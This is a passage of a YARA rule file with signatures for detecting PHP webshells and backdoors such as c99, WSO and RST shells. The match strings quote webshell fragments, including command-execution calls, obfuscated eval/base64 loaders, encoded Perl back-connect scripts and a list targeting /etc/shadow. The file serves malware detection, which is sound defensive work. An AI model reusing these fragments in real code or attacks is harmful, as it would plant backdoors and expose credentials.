        $s2 = "\\*=-- MEMBERS AREA --=*/"
        $s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000207
{
    meta:
        description = "semi-auto-generated ngh.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "Cr4sh_aka_RKL"
        $s1 = "NGH edition"
        $s2 = "/* connectback-backdoor on perl"
        $s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
        $s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000208
{
    meta:
        description = "semi-auto-generated simattacker vrsion 1.0.0 priv8 4 my friend.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend"
        $s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
        $s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000209
{
    meta:
        description = "semi-auto-generated phvayvv.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "{mkdir(\"$dizin/$duzenx2\",777)"
        $s1 = "$baglan=fopen($duzkaydet,'w');"
        $s2 = "PHVayv 1.0"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000210
{
    meta:
        description = "semi-auto-generated rst_sql.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "C:\\tmp\\dump_"
        $s1 = "RST MySQL"
        $s2 = "http://rst.void.ru"
        $s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000211
{
    meta:
        description = "semi-auto-generated c99madshell_v2.0.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000212
{
    meta:
        description = "semi-auto-generated backupsql.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" ."
        $s4 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000213
{
    meta:
        description = "semi-auto-generated uploader.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $a0 = "move_uploaded_file($userfile, \"entrika.php\"); "
        $a1 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">"
        $a2 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">"
        
        $b0 = "move_uploaded_file($userfile, \"entrika.php\"); "
        $b1 = "move_uploaded_file($userfile, \"entrika.php\"); "
        
    condition:
        2 of ($a*) or 1 of ($b*)
}
rule Backdoor_Webshell_PHP_000214
{
    meta:
        description = "semi-auto-generated w3d.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "W3D Shell"
        $s1 = "By: Warpboy"
        $s2 = "No Query Executed"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000215
{
    meta:
        description = "semi-auto-generated dx.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
        $s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util"
        $s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000216
{
    meta:
        description = "semi-auto-generated csh.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = ".::[c0derz]::. web-shell"
        $s1 = "http://c0derz.org.ua"
        $s2 = "vint21h@c0derz.org.ua"
        $s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000217
{
    meta:
        description = "semi-auto-generated phpinj.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "News Remote PHP Shell Injection"
        $s3 = "Php Shell <br />"
        $s4 = "<input type = \"text\" name = \"url\" value = \""
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000218
{
    meta:
        description = "semi-auto-generated 2008.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "Codz by angel(4ngel)"
        $s1 = "Web: http://www.4ngel.net"
        $s2 = "$admin['cookielife'] = 86400;"
        $s3 = "$errmsg = 'The file you want Downloadable was nonexistent';"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000219
{
    meta:
        description = "semi-auto-generated ak74shell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION["
        $s2 = "AK-74 Security Team Web Site: www.ak74-team.net"
        $s3 = "$xshell"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000220
{
    meta:
        description = "semi-auto-generated rem view.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\""
        $s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
        $s4 ="Welcome to phpRemoteView (RemView)"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000221
{
    meta:
        description = "semi-auto-generated stnc.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "drmist.ru"
        $s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80"
        $s2 = "STNC WebShell"
        $s3 = "http://www.security-teams.net/index.php?showtopic="
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000222
{
    meta:
        description = "semi-auto-generated azrailphp v1.0.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "azrailphp"
        $s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>"
        $s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000223
{
    meta:
        description = "semi-auto-generated moroccan spamers ma-edition by ghost.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = ";$sd98=\"john.barker446@gmail.com\""
        $s1 = "print \"Sending mail to $to....... \";"
        $s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000224
{
    meta:
        description = "semi-auto-generated zacosmall.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "rand(1,99999);$sj98"
        $s1 = "$dump_file.='`'.$rows2[0].'`"
        $s3 = "filename=\\\"dump_{$db_dump}_${table_d"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000225
{
    meta:
        description = "semi-auto-generated mysql_shell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "SooMin Kim"
        $s1 = "smkim@popeye.snu.ac.kr"
        $s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000226
{
    meta:
        description = "semi-auto-generated dive shell 1.0 emperor hacking team.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "Emperor Hacking TEAM"
        $s1 = "Simshell"
        $s2 = "ereg('^[[:blank:]]*cd[[:blank:]]"
        $s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000227
{
    meta:
        description = "semi-auto-generated backup.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "#phpMyAdmin MySQL-Dump"
        $s2 = ";db_connect();header('Content-Type: application/octetstr"
        $s4 = "$data .= \"#Database: $database"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000228
{
    meta:
        description = "semi-auto-generated phpshell17.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
        $s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></"
        $s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000229
{
    meta:
        description = "semi-auto-generated myshell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory."
        $s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color"
        $s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000230
{
    meta:
        description = "semi-auto-generated simshell 1.0 simorgh security mgz.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "Simorgh Security Magazine "
        $s1 = "Simshell.css"
        $s2 = "} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], "
        $s3 = "www.simorgh-ev.com"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000231
{
    meta:
        description = "semi-auto-generated rootshell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "shells.dl.am"
        $s1 = "This server has been infected by $owner"
        $s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>"
        $s4 = "Could not write to file! (Maybe you didn't enter any text?)"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000232
{
    meta:
        description = "semi-auto-generated defacekeeper_0.2.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>"
        $s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9"
        $s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000233
{
    meta:
        description = "semi-auto-generated wso.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi"
        $s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000234
{
    meta:
        description = "semi-auto-generated backdoor1.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\".."
        $s2 = "class backdoor {"
        $s4 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000235
{
    meta:
        description = "semi-auto-generated dxshell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
        $s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000236
{
    meta:
        description = "semi-auto-generated hidshell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000237
{
    meta:
        description = "semi-auto-generated php backdoor connect.pl.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "LorD of IRAN HACKERS SABOTAGE"
        $s1 = "LorD-C0d3r-NT"
        $s2 = "echo --==Userinfo==-- ;"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000238
{
    meta:
        description = "semi-auto-generated antichat socks5 server.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);"
        $s3 = "#   [+] Domain name address type"
        $s4 = "www.antichat.ru"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000239
{
    meta:
        description = "semi-auto-generated antichat shell v1.3.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "Antichat"
        $s1 = "Can't open file, permission denide"
        $s2 = "$ra44"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000240
{
    meta:
        description = "semi-auto-generated mysql.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "action=mysqlread&mass=loadmass\">load all defaults"
        $s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru"
        $s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = "
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000241
{
    meta:
        description = "semi-auto-generated worse linux shell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td"
        $s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000242
{
    meta:
        description = "semi-auto-generated cyberlords_sql.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "Coded by n0 [nZer0]"
        $s1 = " www.cyberlords.net"
        $s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE"
        $s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000243
{
    meta:
        description = "semi-auto-generated pws.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>"
        $s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>"
        $s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000244
{
    meta:
        description = "semi-auto-generated php shell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
        $s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000245
{
    meta:
        description = "semi-auto-generated ayyildiz tim ayt shell v 2.1 biz.html.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "Ayyildiz"
        $s1 = "TouCh By iJOo"
        $s2 = "First we check if there has been asked for a working directory"
        $s3 = "http://ayyildiz.org/images/whosonline2.gif"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000246
{
    meta:
        description = "semi-auto-generated lamashell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "lama's'hell"
        $s1 = "if($_POST['king'] == \"\") {"
        $s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000247
{
    meta:
        description = "semi-auto-generated Ajax_PHP Command Shell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>"
        $s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help"
        $s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000248
{
    meta:
        description = "semi-auto-generated Sincap.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');"
        $s2 = "$tampon4=$tampon3-1"
        $s3 = "@aventgrup.net"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000249
{
    meta:
        description = "semi-auto-generated Test.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$yazi = \"test\" . \"\\r\\n\";"
        $s2 = "fwrite ($fp, \"$yazi\");"
        $s3 = "$entry_line=\"HACKed by EntriKa\";"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000250
{
    meta:
        description = "semi-auto-generated mysql_tool.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['"
        $s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV"
        $s4 = "<div align=\"center\">The backup process has now started<br "
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000251
{
    meta:
        description = "semi-auto-generated sh.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e"
        $s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000252
{
    meta:
        description = "semi-auto-generated phpbackdoor15.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na"
        $s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI"
        $s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000253
{
    meta:
        description = "semi-auto-generated phpjackal.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s3 = "$dl=$_REQUEST['downloaD'];"
        $s4 = "else shelL(\"perl.exe $name $port\");"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000254
{
    meta:
        description = "semi-auto-generated sql.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#"
        $s2 = "http://rst.void.ru"
        $s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000255
{
    meta:
        description = "semi-auto-generated ru24_post_sh.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>"
        $s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
        $s4 = "Writed by DreAmeRz"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000256
{
    meta:
        description = "semi-auto-generated DTool Pro.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "r3v3ng4ns\\nDigite"
        $s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi"
        $s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000257
{
    meta:
        description = "semi-auto-generated php-include-w-shell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd"
        $s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000258
{
    meta:
        description = "semi-auto-generated Safe0ver Shell  Safe Mod Bypass By Evilc0der.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "Safe0ver"
        $s1 = "Script Gecisi Tamamlayamadi!"
        $s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000259
{
    meta:
        description = "semi-auto-generated shell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "/* We have found the parent dir. We must be carefull if the parent "
        $s2 = "$tmpfile = tempnam('/tmp', 'phpshell');"
        $s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000260
{
    meta:
        description = "semi-auto-generated ironshell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "www.ironwarez.info"
        $s1 = "$cookiename = \"wieeeee\";"
        $s2 = "~ Shell I"
        $s3 = "www.rootshell-team.info"
        $s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000261
{
    meta:
        description = "semi-auto-generated backdoorfr.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan"
        $s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000262
{
    meta:
        description = "semi-auto-generated h4ntu shell [powered by tsoi].txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "h4ntu shell"
        $s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000263
{
    meta:
        description = "semi-auto-generated PHANTASMA.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = ">[*] Safemode Mode Run</DIV>"
        $s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"
        $s2 = "[*] Spawning Shell"
        $s3 = "Cha0s"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000264
{
    meta:
        description = "semi-auto-generated simple_cmd.html.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "<title>G-Security Webshell</title>"
        $s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" "
        $s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>"
        $s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000265
{
    meta:
        description = "semi-auto-generated from files 1.txt, c2007.php.txt, c100.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
        $s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000266
{
    meta:
        description = "semi-auto-generated from files nst.php.txt, img.php.txt, nstview.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i"
        $s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v"
        $s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000267
{
    meta:
        description = "semi-auto-generated from files network.php.txt, xinfo.php.txt, nfm.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa"
        $s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000268
{
    meta:
        description = "semi-auto-generated r577.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o"
        $s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000269
{
    meta:
        description = "semi-auto-generated from files c99shell_v1.0.php.txt, c99php.txt, SsEs.php.txt, ctt_sh.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\""
        $s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\""
        $s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\""
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000270
{
    meta:
        description = "semi-auto-generated from files r577.php.txt, spy.php.txt, s.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
        $s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000271
{
    meta:
        description = "semi-auto-generated c99.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\""
        $s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile"
        $s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr"
        $s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000272
{
    meta:
        description = "semi-auto-generated c99madshell_v2.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "$sess_data[\"cut\"] = array(); c99_s"
        $s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000273
{
    meta:
        description = "semi-auto-generated from files w.php.txt, wacking.php.txt, SpecialShell_99.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
